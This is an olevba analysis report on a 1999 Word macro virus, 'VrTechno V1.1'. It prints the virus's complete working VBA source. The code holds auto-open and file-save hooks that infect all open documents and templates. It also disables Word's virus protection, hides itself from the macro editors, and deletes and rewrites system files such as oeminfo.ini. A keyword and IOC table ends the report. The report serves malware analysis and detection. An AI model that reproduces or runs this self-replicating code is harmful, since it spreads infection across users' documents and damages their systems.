olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Techno-ee9093162b205401ab38b92606f1d11bd59f4977
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Techno-ee9093162b205401ab38b92606f1d11bd59f4977 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VrTechnoCode.bas 
in file: Virus.MSWord.Techno-ee9093162b205401ab38b92606f1d11bd59f4977 - OLE stream: 'Macros/VBA/VrTechnoCode'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
    '-------------------------------------------------------'
    '  VR Òåõíîëîãèÿ v1.1 by John Great from Russia (C)'99  '
    '-------------------------------------------------------'

Const VrMName As String = "VrTechnoCode"
Const VrVersion As String = "VrTechno V1.1"
Const VrPassword As String = "Elite"
Const VrCopyright As String = "Word Macro ÂÈÐÓÑ!!!" & vbCr & "ÄÂÞÈ ÌÂÄ ÐÔ  © 1999"

'-------------------'
'  Install-Module:  '
'-------------------'

Private Sub VrInstall(): On Error Resume Next
Application.EnableCancelKey = 0: Application.DisplayAlerts = 0: WordBasic.DisableAutoMacros 0
'Ïðîâåðêà èíñòàëÿöèè
    For Each aDoc In Documents
    If aDoc.VBProject.Description <> VrVersion Then GoSub VrInfect Else If aDoc.ProtectionType <> wdNoProtection Then aDoc.Unprotect VrPassword
    Next
    For Each aDoc In Templates
    If aDoc.VBProject.Description <> VrVersion Then
    GoSub VrInfect: aDoc.Save
    Else: If aDoc.ProtectionType <> wdNoProtection Then aDoc.Unprotect VrPassword
    End If: Next: GoTo Err_Code
VrInfect:
    VrFName = Application.Options.DefaultFilePath(wdProgramPath) & "\" + VrMName
    MacroContainer.VBProject.VBComponents(VrMName).Export (VrFName)
    aDoc.VBProject.VBComponents.Import (VrFName): Kill (VrFName)
    aDoc.VBProject.Description = VrVersion
    WordBasic.SetPrivateProfileString "VrTechno", "Version", VrVersion, "win.ini"
    x = WordBasic.[GetPrivateProfileString$]("VrTechno", "Install", "win.ini")
    WordBasic.SetPrivateProfileString "VrTechno", "Install", CStr(IIf(x = "", 0, x) + 1), "win.ini"
Return
Err_Code:
If IsChance(9) Then AddOemInfo
If IsChance(20) Then CreateImageScreen
End Sub

'-------------------'
'  Infect-Module:   '
'-------------------'

'Îòêðûòü
Sub AutoOpen(): VrInstall: End Sub
Sub AutoExec(): VrInstall: End Sub
Sub FileOpen(): WordBasic.DisableAutoMacros True
If Dialogs(wdDialogFileOpen).Show Then VrInstall
End Sub
'Íîâûé äîêóìåíò
Sub FileNew(): Application.Documents.Add: VrInstall: End Sub
Sub FileNewDefault()
Application.Documents.Add Template:=NormalTemplate.FullName: VrInstall: End Sub
'Ñîõðàíèòü
Sub FileSaveAs(): VrInstall
If Dialogs(wdDialogFileSaveAs).Show Then
If Not (ActiveDocument.SaveFormat = 0 Or ActiveDocument.SaveFormat = 1) Then ActiveDocument.SaveAs FileFormat:=1
End If: End Sub
Sub FileSave(): On Error Resume Next: VrInstall: ActiveDocument.Save
If ActiveDocument.Saved Then
If Not (ActiveDocument.SaveFormat = 0 Or ActiveDocument.SaveFormat = 1) Then ActiveDocument.SaveAs FileFormat:=1
End If: End Sub
'Çàêðûòü
Sub FileClose(): FileSave
If ActiveDocument.Saved Then
If ActiveDocument.ProtectionType = -1 Then ActiveDocument.Protect 2, 0, VrPassword
ActiveDocument.Save: End If: ActiveDocument.Close wdDoNotSaveChanges: End Sub
Sub DocClose(): FileClose: End Sub

'-------------------'
'  Stealth-Module:  '
'-------------------'

Sub ViewVBCode(): VrStealth: End Sub    'ToolsCustomize
Sub ToolsMacro(): VrStealth: End Sub
Sub FileTemplates(): VrStealth: End Sub
Sub ToolsOptions()
If Dialogs(wdDialogToolsOptions).Show Then
Options.SaveNormalPrompt = 0: Options.VirusProtection = 0
End If: End Sub
Private Sub VrStealth()
If IsChance(5) Then
With Assistant.NewBalloon
    .Animation = msoAnimationThinking
    .Button = msoButtonSetOK
    .Heading = "VR Òåõíîëîãèÿ v1.0"
    .Text = VrCopyright
    .Show
End With: End If: End Sub
Private Function IsChance(Num As Integer) As Boolean
Randomize: IsChance = Not CBool(Int(Rnd * Num)): End Function

'-------------------'
' Destruct-Module:  '
'-------------------'

Sub FilePrint(): With Dialogs.Item(wdDialogFilePrint)
If IsChance(5) Then .FileName = "C:\autoexec.bat"
.Show: End With: End Sub
Sub FilePrintDefault()
If IsChance(5) Then Application.PrintOut FileName:="C:\autoexec.bat" Else ActiveDocument.PrintOut
End Sub

Private Sub AddOemInfo(): On Error Resume Next: fn = "C:\Windows\System"
If Dir(fn, vbDirectory) <> "" Then
fn = fn + "\oeminfo.ini": Kill (fn): Open fn For Output As #1
Print #1, "[General]"
Print #1, "Manufacturer=ÄÂÞÈ ÌÂÄ ÐÔ"
Print #1, "Model=MS Word Âèðóñ"
Print #1, "[Support Information]"
Print #1, "Line1=Êîìïüþòåð çàðàæåí âèðóñîì: " + VrVersion
Print #1, "Line2="
Print #1, "Line3=Word Macro Virus"
Print #1, "Line4=John Great, ÄÂÞÈ ÌÂÄ ÐÔ - (C) '1999"
Close #1: End If: End Sub

Private Sub CreateImageScreen()
On Error Resume Next: Application.ScreenUpdating = 0: Application.EnableCancelKey = wdCancelDisabled
If ActiveDocument.ProtectionType = wdNoProtection Then
x0 = (ActiveDocument.PageSetup.PageWidth - 410) / 2: y0 = ActiveDocument.PageSetup.TopMargin
Set aShape = ActiveDocument.Shapes.AddShape(msoShapeRoundedRectangle, x0, y0, 410, 130)
With aShape
.Fill.Visible = msoTrue
.Fill.ForeColor.RGB = RGB(255, 255, 255)
.Fill.Transparency = 0.5
.Fill.OneColorGradient msoGradientHorizontal, 4, 0.23
.ZOrder msoBringInFrontOfText
.TextFrame.TextRange.Select
With Selection
.LanguageID = wdEnglishUS
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Bold = True: .Font.Italic = False
.Font.Name = "Times New Roman": .Font.Size = 20
.TypeText Text:="Microsoft Word Macro Virus"
.Font.Italic = True: .Font.Size = 14
.TypeText Text:=vbCr + "VrTechnoCode" + vbCr
.Font.Italic = False: .Font.Bold = False: .Font.Size = 10
.ParagraphFormat.Alignment = wdAlignParagraphLeft
.TypeText Text:="- Word 7.0" + vbCr + "- Stealth Technology" + vbCr + "- Infect Documents and Templates" + vbCr + vbCrLf
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Italic = True: .Font.Bold = True: .Font.Size = 14
.TypeText Text:="Copyright by John Great from Russia Far East, Khabarovsk'1999"
End With: End With
With ActiveDocument.Shapes.AddShape(msoShapeExplosion1, x0 + 225, y0 + 25, 180, 72)
.IncrementRotation 180#
.Fill.Visible = msoTrue
.Fill.PresetGradient msoGradientHorizontal, 1, msoGradientFire
.ZOrder msoSendBehindText
.TextFrame.TextRange.Select
With Selection
.Font.Bold = True: .Font.Italic = True
.ParagraphFormat.Alignment = wdAlignParagraphCenter
.Font.Name = "Times New Roman": .Font.Size = 16
.TypeText Text:="Version 1.1"
End With
ActiveDocument.Shapes.Range(Array(aShape.Name, .Name)).Select
Selection.ShapeRange.Group.Select: ActiveDocument.UndoClear
End With: End If: Application.ScreenUpdating = -1: End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

